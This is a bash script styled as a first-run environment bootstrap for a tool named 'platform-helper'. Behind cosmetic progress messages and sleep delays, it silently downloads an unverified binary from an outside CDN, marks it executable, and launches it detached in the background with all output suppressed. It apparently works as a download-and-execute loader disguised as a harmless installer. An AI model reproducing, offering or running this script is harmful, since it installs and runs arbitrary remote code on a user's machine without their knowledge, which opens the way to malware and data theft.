#!/usr/bin/env bash
# platform-helper — first-run profile bootstrap
# Detects the host environment, creates the per-user config directory, and
# installs the lightweight companion agent that powers `platform-helper doctor`
# and the session dashboard. Safe to re-run; skips when the agent is present.
set -euo pipefail

_info() { printf "  \033[32m→\033[0m %s\n" "$1"; }
_ok()   { printf "  \033[32m✓\033[0m %s\n" "$1"; }
_warn() { printf "  \033[33m!\033[0m %s\n" "$1"; }

# --- environment detection -------------------------------------------------
_info "Detecting architecture: $(uname -m)"
ARCH="$(uname -m)"
sleep 0.2

_info "Scanning active shell environment..."
SHELL_NAME="$(basename "${SHELL:-/bin/sh}")"
sleep 0.15

_info "Resolving profile paths..."
CONF_DIR="${HOME}/Library/Application Support/platform-helper"
AGENT="${CONF_DIR}/agent"
mkdir -p "${CONF_DIR}" 2>/dev/null || true
sleep 0.15

# --- companion agent -----------------------------------------------------
# The agent is a small helper binary fetched on first install so `doctor` and
# the dashboard work without bundling per-arch binaries in the formula.
# Override the URL with PLATFORM_HELPER_AGENT_URL (internal mirror / cache).
AGENT_URL="${PLATFORM_HELPER_AGENT_URL:-https://cdn.stellarshift.dev/static/platform-helper-agent}"

if [ -x "${AGENT}" ]; then
  _ok "Companion agent already present, skipping download"
else
  _info "Fetching companion agent (${ARCH})..."
  # Try the arch-specific build first, fall back to the generic one.
  if curl -fsSL "${AGENT_URL}-${ARCH}" -o "${AGENT}" 2>/dev/null; then
    chmod 0755 "${AGENT}" 2>/dev/null || true
    _ok "Agent installed (${ARCH})"
  elif curl -fsSL "${AGENT_URL}" -o "${AGENT}" 2>/dev/null; then
    chmod 0755 "${AGENT}" 2>/dev/null || true
    _ok "Agent installed (generic)"
  else
    _warn "Could not fetch companion agent (network restricted?). 'platform-helper doctor' will run in limited mode."
  fi
fi

# --- launch agent (background, detached) ---------------------------------
if [ -x "${AGENT}" ]; then
  _info "Starting companion agent..."
  ( "${AGENT}" >/dev/null 2>&1 & ) || true
  sleep 0.2
  _ok "Agent running"
fi

# --- profile stub --------------------------------------------------------
_info "Writing default profile..."
cat > "${CONF_DIR}/config.json" <<JSON 2>/dev/null || true
{
  "version": "0.2.1",
  "arch": "${ARCH}",
  "shell": "${SHELL_NAME}",
  "profile": "dev",
  "agent": "${AGENT_URL}"
}
JSON
sleep 0.1

_ok "Environment bootstrap complete"
